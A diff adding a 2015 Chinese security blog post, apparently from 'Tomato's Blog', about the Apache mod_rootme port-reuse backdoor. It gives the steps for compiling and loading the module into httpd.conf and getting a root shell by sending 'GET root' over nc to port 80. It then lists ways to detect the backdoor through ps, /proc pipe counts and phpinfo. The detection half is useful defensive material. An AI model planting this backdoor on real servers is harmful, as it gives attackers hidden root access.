@@ -1,0 +1,167 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Apache端口复用后门</title>
+  <link rel="icon" href="/favicon.ico">
+  <link rel="apple-touch-icon" href="/public/img/head.png">
+  <link rel="stylesheet" href="/public/css/amazeui.min.css">
+  <link rel="stylesheet" href="/public/css/app.css">
+  <link rel="stylesheet" href="/public/css/highlight-js/github.css">
+</head>
+<body>
+
+<div class="am-container lp-container">
+  <header class="am-topbar lp-topbar">
+    <h1 class="am-topbar-brand">
+      <a href="/">Tomato's Blog</a>
+    </h1>
+    <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-danger am-show-sm-only" data-am-collapse="{target: '#lp-topbar-collapse'}"><span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span></button>
+    <div class="am-collapse am-topbar-collapse am-topbar-right" id="lp-topbar-collapse">
+      <ul class="am-nav am-nav-pills am-topbar-nav">
+        <li><a href="/">Archives</a></li>
+        <!-- <li><a href="#">Categories</a></li> -->
+        <li><a href="/friends.html">Friends</a></li>
+        <!-- <li><a href="#">About Me</a></li> -->
+        <li><a href="/feed.xml">Feed</a></li>
+      </ul>
+    </div>
+  </header>
+</div>
+
+
+<div class="am-container lp-container">
+  <div class="lp-post">
+    <div class="lp-post-header">
+      <h1 class="lp-post-title">Apache端口复用后门</h1>
+      <div class="lp-post-meta">
+        <i class="am-icon-calculator"></i><span class="lp-post-date">2015-09-10</span>
+        <i class="am-icon-tags"></i><span class="lp-post-tags">penetration, backdoor</span>
+      </div>
+    </div>
+    <div class="lp-post-content">
+    <p>测试环境</p>
+
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code>CentOSx64 6.5
+Apache2.5
+</code></pre>
+</div>
+<p><strong>0x01 利用方式</strong></p>
+
+<p>先修改后门的里面的httpd22.h文件，不修改的话，在apache启动的时候会报错</p>
+
+<div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="err">将</span><span class="o">:</span>
+<span class="cp">#define MODULE_MAGIC_COOKIE 0x41503230UL
+</span><span class="err">改为</span><span class="o">:</span>
+<span class="cp">#define MODULE_MAGIC_COOKIE 0x41503232UL
+</span>
+<span class="err">将</span><span class="o">:</span>
+<span class="cp">#define MODULE_MAGIC_NUMBER_MAJOR 20020903
+</span><span class="err">改为</span><span class="o">:</span>
+<span class="cp">#define MODULE_MAGIC_NUMBER_MAJOR 20051115
+</span></code></pre>
+</div>
+<p>然后保存。输入make linux进行编译</p>
+
+<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-185317750.jpg" alt="185317750" /></p>
+
+<p>然后修改/etc/httpd/conf/httpd.conf</p>
+
+<p>添加 LoadModule rootme22_module modules/mod_rootme22.so 加载这个模块。</p>
+
+<p>然后启动apache</p>
+
+<p>然后使用就可以连接80端口 nc ip 80 然后输入GET root</p>
+
+<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-4195482967.jpg" alt="4195482967" /></p>
+
+<p>成功获取shell</p>
+
+<p><strong>0x02 检测方式</strong></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>1.通过ps -ef</td>
+      <td>grep httpd 可以看到有root用户使用的httpd子进程</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-67507677.jpg" alt="67507677" /></p>
+
+<p>然后可以进一步去查看apache配置文件</p>
+
+<p>2.通过</p>
+
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code>ps -ef | grep http | head -n 1 | awk <span class="s1">'{system("ls -l /proc/"$2"/fd")}'</span> | grep pipe | wc -l
+</code></pre>
+</div>
+<p>正常情况下是64，加载了mod_rootme后是66</p>
+
+<p>3.在web目录下写个phpinfo看是否加载了mod_rootme模块</p>
+
+
+    </div>
+    
+    <div id="disqus_thread"></div>
+<script type="text/javascript">
+var disqus_shortname = "tomatos-blog";
+
+/* * * DON'T EDIT BELOW THIS LINE * * */
+(function() {
+var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+  </div>
+</div>
+
+<div class="am-container lp-container">
+  <footer class="am-footer lp-footer">
+    <p>Copyright © 2014-2017 All Rights Reserved</p>
+    <p>Theme By <a href="https://github.com/RickGray/light-post">LightPost</a></p>
+  </afooter>
+</div>
+
+
+<div data-am-widget="gotop" class="am-gotop am-gotop-fixed">
+  <a href="#top" title="回到顶部">
+    <span class="am-gotop-title">GoTop</span>
+    <i class="am-gotop-icon am-icon-chevron-up"></i>
+  </a>
+</div>
+
+<script src="/public/js/jquery.min.js"></script>
+<script src="/public/js/amazeui.min.js"></script>
+<script>
+$(document).ready(function(){
+  $.AMUI.progress.start();
+});
+$(window).load(function(){
+  $.AMUI.progress.done();
+});
+</script>
+<script src="/public/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<!-- 网站统计代码 -->
+<div hidden>
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1256394309'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/z_stat.php%3Fid%3D1256394309%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
+</div>
+<div hidden>
+<script>
+var _hmt = _hmt || [];
+(function() {
+var hm = document.createElement("script");
+hm.src = "//hm.baidu.com/hm.js?3601be0ac702a94d879f3f571cec1e53";
+var s = document.getElementsByTagName("script")[0];
+s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</div>
+</body>
+</html>
